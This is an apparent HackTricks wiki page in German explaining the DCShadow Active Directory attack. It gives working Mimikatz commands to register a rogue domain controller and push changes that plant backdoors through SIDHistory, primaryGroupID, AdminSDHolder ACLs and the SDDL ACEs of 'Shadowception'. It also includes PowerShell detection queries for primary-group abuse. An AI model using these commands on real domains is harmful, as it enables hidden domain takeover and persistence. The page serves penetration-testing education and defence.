# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Es registriert einen **neuen Domain Controller** in der AD und verwendet ihn, um **Attribute** (SIDHistory, SPNs ...) auf bestimmten Objekten zu **pushen**, ohne **Logs** bezüglich der **Änderungen** zu hinterlassen. Sie benötigen **DA**-Berechtigungen und müssen sich innerhalb der **Stamm-Domäne** befinden.\
Beachten Sie, dass bei der Verwendung falscher Daten ziemlich unschöne Logs erscheinen werden.<sup>[[2]](#references)</sup>

Für den Angriff benötigen Sie 2 Mimikatz-Instanzen. Eine davon startet die RPC-Server mit SYSTEM-Berechtigungen (hier müssen Sie die Änderungen angeben, die Sie durchführen möchten), und die andere Instanz wird verwendet, um die Werte zu pushen:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Beachte, dass **`elevate::token`** in der `mimikatz1`-Session nicht funktioniert, da dadurch die Berechtigungen des Threads erhöht werden, wir aber die **Berechtigungen des Prozesses** erhöhen müssen.\
Du kannst auch ein "LDAP"-Objekt auswählen: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Du kannst die Änderungen von einem DA oder von einem Benutzer mit diesen minimalen Berechtigungen durchführen:

- Im **Domain-Objekt**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- Das **Sites-Objekt** (und seine untergeordneten Objekte) im **Configuration-Container**:
- _CreateChild und DeleteChild_
- Das Objekt des **Computers, der als DC registriert ist**:
- _WriteProperty_ (nicht Write)
- Das **Zielobjekt**:
- _WriteProperty_ (nicht Write)

Du kannst [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) verwenden, um einem unprivilegierten Benutzer diese Berechtigungen zu erteilen (beachte, dass dies einige Logs hinterlassen wird). Dies ist deutlich restriktiver als DA-Berechtigungen.\
Beispiel: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Das bedeutet, dass der Benutzername _**student1**_, wenn er auf dem Computer _**mcorp-student1**_ angemeldet ist, über DCShadow-Berechtigungen für das Objekt _**root1user**_ verfügt.

## DCShadow zum Erstellen von Backdoors verwenden
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Missbrauch der primären Gruppe, Aufzählungslücken und Erkennung

- `primaryGroupID` ist ein separates Attribut von der `member`-Liste der Gruppe. DCShadow/DSInternals können es direkt schreiben (z. B. `primaryGroupID=512` für **Domain Admins**), ohne eine Durchsetzung durch LSASS on-box. AD **verschiebt** den Benutzer jedoch weiterhin: Eine Änderung der PGID entfernt die Mitgliedschaft immer aus der bisherigen primären Gruppe (dasselbe Verhalten gilt für jede Zielgruppe), daher kann die alte Mitgliedschaft in der primären Gruppe nicht beibehalten werden.<sup>[[1]](#references)</sup>
- Standardtools verhindern das Entfernen eines Benutzers aus seiner aktuellen primären Gruppe (`ADUC`, `Remove-ADGroupMember`), daher erfordert eine Änderung der PGID normalerweise direkte Verzeichnis-Schreibvorgänge (DCShadow/`Set-ADDBPrimaryGroup`).
- Die Meldung von Mitgliedschaften ist inkonsistent:
- **Schließt aus der primären Gruppe abgeleitete Mitglieder ein:** `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Lässt aus der primären Gruppe abgeleitete Mitglieder aus:** `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit bei der Prüfung von `member`, `Get-ADUser <user> -Properties memberOf`.
- Rekursive Prüfungen können Mitglieder der primären Gruppe übersehen, wenn die **primäre Gruppe selbst verschachtelt** ist (z. B. wenn die PGID des Benutzers auf eine verschachtelte Gruppe innerhalb von Domain Admins verweist); `Get-ADGroupMember -Recursive` oder rekursive LDAP-Filter geben diesen Benutzer nicht zurück, sofern die Rekursion primäre Gruppen nicht ausdrücklich auflöst.
- DACL-Tricks: Angreifer können **ReadProperty** für `primaryGroupID` beim Benutzer (oder für das Gruppenattribut `member` bei Gruppen, die nicht durch AdminSDHolder geschützt sind) **verweigern** und dadurch die effektive Mitgliedschaft vor den meisten PowerShell-Abfragen verbergen; `net group` löst die Mitgliedschaft weiterhin auf. Durch AdminSDHolder geschützte Gruppen setzen solche Verweigerungen zurück.

Beispiele für Erkennung/Überwachung:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Vergleiche privilegierte Gruppen, indem du die Ausgabe von `Get-ADGroupMember` mit `Get-ADGroup -Properties member` oder ADSI Edit abgleichst, um durch `primaryGroupID` oder versteckte Attribute verursachte Abweichungen zu erkennen.<sup>[[1]](#references)</sup>

## Shadowception - DCShadow-Berechtigungen mit DCShadow vergeben (keine Logs über geänderte Berechtigungen)

Wir müssen die folgenden ACEs mit der SID unseres Benutzers am Ende anhängen:<sup>[[2]](#references)</sup>

- Beim Domänenobjekt:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Beim Computerobjekt des Angreifers: `(A;;WP;;;UserSID)`
- Beim Zielbenutzerobjekt: `(A;;WP;;;UserSID)`
- Beim Sites-Objekt im Configuration-Container: `(A;CI;CCDC;;;UserSID)`

Um die aktuelle ACE eines Objekts abzurufen: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Beachte, dass du in diesem Fall **mehrere Änderungen** und nicht nur eine vornehmen musst. Verwende daher in der **mimikatz1-Sitzung** (RPC-Server) bei jeder gewünschten Änderung den Parameter **`/stack`**. Auf diese Weise musst du nur einmal **`/push`** verwenden, um alle auf dem Rogue-Server gestapelten Änderungen auszuführen.

[**Weitere Informationen über DCShadow auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## Referenzen

- [1] [TrustedSec - Abenteuer mit dem Verhalten, Reporting und der Ausnutzung von Primary Groups](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow-Beitrag auf ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
